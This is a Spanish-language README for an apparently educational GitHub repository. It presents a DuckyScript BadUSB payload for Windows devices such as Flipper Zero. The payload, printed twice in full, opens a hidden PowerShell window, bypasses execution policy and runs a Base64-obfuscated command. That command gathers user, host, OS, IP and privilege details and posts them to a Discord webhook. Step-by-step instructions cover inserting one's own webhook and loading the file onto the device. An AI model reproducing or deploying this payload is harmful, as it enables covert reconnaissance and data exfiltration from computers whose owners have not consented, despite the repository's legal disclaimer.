# duckyscript-recon-basico
# 🦆 DuckyScript - Reconocimiento Windows + Exfiltración vía Discord

Repositorio **educativo** que documenta un payload de **DuckyScript** para 
Windows. El script realiza reconocimiento básico del sistema y exfiltra la 
información a un **Webhook de Discord** usando un comando PowerShell 
ofuscado en **Base64 (UTF-16LE)** generado con **CyberChef**.

> ⚠️ **AVISO LEGAL**  
> Este repositorio tiene fines **exclusivamente educativos y de investigación 
> en ciberseguridad**. Todo el contenido debe probarse únicamente en **equipos 
> propios o con autorización explícita por escrito**, preferiblemente en 
> máquinas virtuales aisladas.  
> El uso no autorizado constituye un delito según la legislación vigente 
> (España: Art. 197 bis y 264 CP; LATAM: leyes equivalentes).  
> **El autor no se hace responsable del mal uso.**
> Simulacion de ataque BadUSB con Flipper Zero en entorno controlado.
> Proyecto educativo de seguridad ofensiva y analisis de deteccion.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
![Platform](https://img.shields.io/badge/platform-Windows-blue)
![PowerShell](https://img.shields.io/badge/PowerShell-5.1%20%7C%207%2B-blue)

---

## 🎯 ¿Qué hace este payload?

1. Se conecta como **teclado HID** (BadUSB).
2. Abre PowerShell **oculto** con bypass de ExecutionPolicy.
3. Ejecuta un comando codificado en Base64 (`-EncodedCommand`).
4. El script recolecta:
   - 👤 Usuario (`whoami`)
   - 💻 Nombre del equipo (`hostname`)
   - 🪟 Versión del SO (`Win32_OperatingSystem`)
   - 🌐 IP local no-loopback (`Get-NetIPAddress`)
   - 🔐 Privilegios (`whoami /priv`)
5. Envía los datos a un **Webhook de Discord** en formato JSON.

---

## 🧪 Pipeline de CyberChef

La receta original (ver `img/cyberchef_recipe.png`) es:

| # | Operación | Parámetros |
|---|-----------|------------|
| 1 | **Encode text** | Encoding: `UTF-16LE (1200)` |
| 2 | **To Base64** | Alphabet: `A-Za-z0-9+/=` |

Resultado: una cadena Base64 que se pasa a `powershell -EncodedCommand`.

---

## 📜 Payload DuckyScript final

```duckyscript
DUCKY_LANG es
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1200
STRING powershell -WindowStyle Hidden -EncodedCommand JAB1ACAAIAA9ACAAdwBoAG8AYQBtAGkACgAkAGgAIAAgAD0AIABoAG8AcwB0AG4AYQBtAGUACgAkAHMAbwAgAD0AIAAoAEcAZQB0AC0AQwBpAG0ASQBuAHMAdABhAG4AYwBlACAAVwBpAG4AMwAyAF8ATwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0AKQAuAEMAYQBwAHQAaQBvAG4ACgAkAGkAcAAgAD0AIAAoACgARwBlAHQALQBOAGUAdABJAFAAQQBkAGQAcgBlAHMAcwAgAC0AQQBkAGQAcgBlAHMAcwBGAGEAbQBpAGwAeQAgAEkAUAB2ADQAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIABJAG4AdABlAHIAZgBhAGMAZQBBAGwAaQBhAHMAIAAtAG4AbwB0AGwAaQBrAGUAIAAnACoATABvAG8AcABiAGEAYwBrACoAJwApAC4ASQBQAEEAZABkAHIAZQBzAHMAIAAtAGoAbwBpAG4AIAAnACwAIAAnACkACgAkAHAAIAAgAD0AIAAoAHcAaABvAGEAbQBpACAALwBwAHIAaQB2ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoACgAkAG0AcwBnACAAPQAgACIAQQBVAEQASQBUAE8AUgBJAEEAYABuAFUAcwB1AGEAcgBpAG8AOgAgACQAdQBgAG4ASABvAHMAdAA6ACAAJABoAGAAbgBTAE8AOgAgACQAcwBvAGAAbgBJAFAAOgAgACQAaQBwAGAAbgBgAG4AUAByAGkAdgBpAGwAZQBnAGkAbwBzADoAYABuACQAcAAiAAoACgAkAGoAcwBvAG4AIAA9ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuACAAQAB7AGMAbwBuAHQAZQBuAHQAPQAkAG0AcwBnAH0AIAAtAEMAbwBtAHAAcgBlAHMAcwAKACQAYgB5AHQAZQBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGoAcwBvAG4AKQAKAAoASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHIAaQAgACIARABpAHMAYwBvAHIAZABfAFcAZQBiAGgAbwBvAGsAXwBVAFIATAAiACAAYAAKACAAIAAtAE0AZQB0AGgAbwBkACAAUABvAHMAdAAgAGAACgAgACAALQBCAG8AZAB5ACAAJABiAHkAdABlAHMAIABgAAoAIAAgAC0AQwBvAG4AdABlAG4AdABUAHkAcABlACAAIgBhAHAAcABsAGkAYwBhAHQAaQBvAG4ALwBqAHMAbwBuADsAIABjAGgAYQByAHMAZQB0AD0AdQB0AGYALQA4ACIA
ENTER
```
---


# 🚀 Uso
  1.Descarga payloads/recon_discord.txt
  2.Reemplaza Discord_Webhook_URL en el script PowerShell antes de codificarlo, o modifica el Base64 por el tuyo.
  3.Codifica todo el comando de PowerShell usando la mezcla mostrada en img/cyberchef_recipe.png (https://gchq.github.io/CyberChef/)
  4.Añade el nuevo '.txt' a tu Rubber Ducky / Pico Ducky / Flipper Zero.
  5.Prueba en una VM Windows aislada o entorno controlado. 😉



# 🧰 Herramientas incluidas
scripts/decode_payload.ps1 → decodifica el Base64 en caso de que quieras auditar el payload.

# 📚 Documentación
  ·Explicación línea a línea
  ·Receta CyberChef
  ·Requisitos
  ·Mitigación


---

# 📜 Licencia
MIT — Solo uso educativo.

---

## 📄 `payloads/recon_discord.txt`

```duckyscript
REM ================================================
REM  DuckyScript - Recon Windows + Exfil Discord
REM  Autor: 14ND3R
REM  Uso: Educativo / Laboratorio aislado
REM ================================================

DUCKY_LANG es
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1200
STRING powershell -WindowStyle Hidden -EncodedCommand JAB1ACAAIAA9ACAAdwBoAG8AYQBtAGkACgAkAGgAIAAgAD0AIABoAG8AcwB0AG4AYQBtAGUACgAkAHMAbwAgAD0AIAAoAEcAZQB0AC0AQwBpAG0ASQBuAHMAdABhAG4AYwBlACAAVwBpAG4AMwAyAF8ATwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0AKQAuAEMAYQBwAHQAaQBvAG4ACgAkAGkAcAAgAD0AIAAoACgARwBlAHQALQBOAGUAdABJAFAAQQBkAGQAcgBlAHMAcwAgAC0AQQBkAGQAcgBlAHMAcwBGAGEAbQBpAGwAeQAgAEkAUAB2ADQAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIABJAG4AdABlAHIAZgBhAGMAZQBBAGwAaQBhAHMAIAAtAG4AbwB0AGwAaQBrAGUAIAAnACoATABvAG8AcABiAGEAYwBrACoAJwApAC4ASQBQAEEAZABkAHIAZQBzAHMAIAAtAGoAbwBpAG4AIAAnACwAIAAnACkACgAkAHAAIAAgAD0AIAAoAHcAaABvAGEAbQBpACAALwBwAHIAaQB2ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoACgAkAG0AcwBnACAAPQAgACIAQQBVAEQASQBUAE8AUgBJAEEAYABuAFUAcwB1AGEAcgBpAG8AOgAgACQAdQBgAG4ASABvAHMAdAA6ACAAJABoAGAAbgBTAE8AOgAgACQAcwBvAGAAbgBJAFAAOgAgACQAaQBwAGAAbgBgAG4AUAByAGkAdgBpAGwAZQBnAGkAbwBzADoAYABuACQAcAAiAAoACgAkAGoAcwBvAG4AIAA9ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuACAAQAB7AGMAbwBuAHQAZQBuAHQAPQAkAG0AcwBnAH0AIAAtAEMAbwBtAHAAcgBlAHMAcwAKACQAYgB5AHQAZQBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGoAcwBvAG4AKQAKAAoASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHIAaQAgACIARABpAHMAYwBvAHIAZABfAFcAZQBiAGgAbwBvAGsAXwBVAFIATAAiACAAYAAKACAAIAAtAE0AZQB0AGgAbwBkACAAUABvAHMAdAAgAGAACgAgACAALQBCAG8AZAB5ACAAJABiAHkAdABlAHMAIABgAAoAIAAgAC0AQwBvAG4AdABlAG4AdABUAHkAcABlACAAIgBhAHAAcABsAGkAYwBhAHQAaQBvAG4ALwBqAHMAbwBuADsAIABjAGgAYQByAHMAZQB0AD0AdQB0AGYALQA4ACIA
ENTER
```

|**💡 Nota:** La parte Discord_Webhook_URL va dentro del Base64. 
|Una vez cambiado el webhook, debes → modificar → upload .txt →  BadUSB / Rubber Ducky / Pico Ducky / Flipper Zero
|(ver scripts/decode_payload.ps1).

---

# Licencia 
MIT - ver [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE).

## Contacto
### GitHub: @AndYLndR
### Email: 14nd3r@proton.me

# 14ND3R ⭐

  
